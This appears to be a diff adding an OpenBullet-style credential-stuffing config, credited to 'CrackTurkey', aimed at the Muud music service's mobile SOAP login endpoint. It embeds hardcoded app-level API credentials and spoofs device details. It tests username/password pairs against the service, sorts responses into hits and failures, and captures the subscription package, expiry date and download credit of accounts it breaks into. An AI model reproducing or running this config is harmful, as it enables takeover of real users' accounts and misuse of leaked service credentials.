@@ -1,0 +1,85 @@
+[SETTINGS]
+{
+  "Name": "Muud",
+  "SuggestedBots": 50,
+  "MaxCPM": 0,
+  "LastModified": "2022-06-22T13:44:42.1589317+03:00",
+  "AdditionalInfo": "",
+  "Author": "Raymond",
+  "Version": "1.4.4 [Anomaly]",
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": false,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "EncodeData": false,
+  "AllowedWordlist1": "",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "CaptchaUrl": "",
+  "Base64": "",
+  "Grayscale": false,
+  "RemoveLines": false,
+  "RemoveNoise": false,
+  "Dilate": false,
+  "Threshold": 1.0,
+  "DiffKeep": 0.0,
+  "DiffHide": 0.0,
+  "Saturate": false,
+  "Saturation": 0.0,
+  "Transparent": false,
+  "Contour": false,
+  "OnlyShow": false,
+  "ContrastGamma": false,
+  "Contrast": 1.0,
+  "Gamma": 1.0,
+  "Brightness": 1.0,
+  "RemoveLinesMin": 0,
+  "RemoveLinesMax": 0,
+  "Crop": false,
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#CrackTurkey FUNCTION RandomString "<v:Envelope xmlns:i=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:d=\"http://www.w3.org/2001/XMLSchema\" xmlns:c=\"http://schemas.xmlsoap.org/soap/encoding/\" xmlns:v=\"http://schemas.xmlsoap.org/soap/envelope/\"><v:Header><os_version>?d?d</os_version><app_version>5.1.6</app_version><device_id>?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d?d</device_id><device_name>?l?l?l?l?l ?l?l-G?d?d?dN</device_name></v:Header><v:Body><n0:login id=\"o0\" c:root=\"1\" xmlns:n0=\"http://ttmuzikfuncs.proarge.com/wsdl/\"><username i:type=\"d:string\">ttm_android</username><password i:type=\"d:string\">l0v3mu51c!</password><loginUsername i:type=\"d:string\"><USER></loginUsername><loginPassword i:type=\"d:string\"><PASS></loginPassword><cdata i:type=\"d:boolean\">false</cdata></n0:login></v:Body></v:Envelope>" -> VAR "POST" 
+
+#CrackTurkey REQUEST POST "https://mobilws.muud.com.tr/TTMuzikWS/services/TTMuzikFuncsPort" 
+  CONTENT "<POST>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#CrackTurkey KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "username veya password hatalı ya da kayıtlı değil" 
+    KEY "<statusCode>3</statusCode>" 
+    KEY "Error: Unexpected close tag" 
+    KEY "xmlns:soap=\"http://schemas.xmlsoap.org/soap/envelope/\"><soap" 
+  KEYCHAIN Success OR 
+    KEY "<statusCode>200</statusCode>" 
+  KEYCHAIN Custom "CUSTOM" OR 
+    KEY "<packageList/><expiredPackedExpirationDate>01.01.1900 10:00:00 AM</expiredPackedExpirationDate>" 
+    KEY "<canOfflineDownload>false</canOfflineDownload>" 
+
+#CrackTurkey PARSE "<SOURCE>" LR "><packageList><packageList><id>" "</name>" -> VAR "pk" 
+
+#CrackTurkey PARSE "<pk>" LR "><name>" "" -> VAR "pk" 
+
+#CrackTurkey FUNCTION Translate 
+  KEY "&#x131;" VALUE "ı" 
+  "<pk>" -> CAP "Paketi" 
+
+#CrackTurkey PARSE "<SOURCE>" LR "<expireDate>" " " CreateEmpty=FALSE -> CAP "Paket Bitiş Tarihi" 
+
+#CrackTurkey PARSE "<SOURCE>" LR "<credit>" "</credit>" CreateEmpty=FALSE -> CAP "Şarkı İndirme Kredisi" 
+
